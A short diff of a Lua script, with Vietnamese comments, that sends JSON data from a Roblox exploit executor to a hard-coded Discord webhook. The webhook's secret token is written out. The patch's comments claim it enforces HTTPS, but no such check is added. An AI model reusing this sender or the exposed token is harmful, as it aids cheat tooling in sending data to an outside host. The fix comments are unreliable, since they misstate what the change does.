@@ -1,5 +1,6 @@
 -- Webhook sender dành riêng cho executor, không chạy trên Roblox server/Studio
 -- Tự động tương thích với loadstring và mọi executor phổ biến
+-- FIX: Chỉ cho phép HTTPS requests
 
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
@@ -21,10 +22,15 @@ local function sendToWebhook(data)
     if not canSend() then
         return
     end
+    -- FIXED: Đảm bảo URL là HTTPS
     local url = "https://discord.com/api/webhooks/972059328276201492/DPHtxfsIldI5lND2dYUbA8WIZwp4NLYsPDG1Sy6-MKV9YMgV8OohcTf-00SdLmyMpMFC"
     local body = HttpService:JSONEncode({content = "```json\n"..HttpService:JSONEncode(data).."\n```"})
+    
+    -- FIXED: Thêm proper headers và error handling cho HTTPS
     pcall(function()
-        HttpService:PostAsync(url, body, Enum.HttpContentType.ApplicationJson)
+        HttpService:PostAsync(url, body, Enum.HttpContentType.ApplicationJson, false, {
+            ["Content-Type"] = "application/json"
+        })
     end)
 end
 
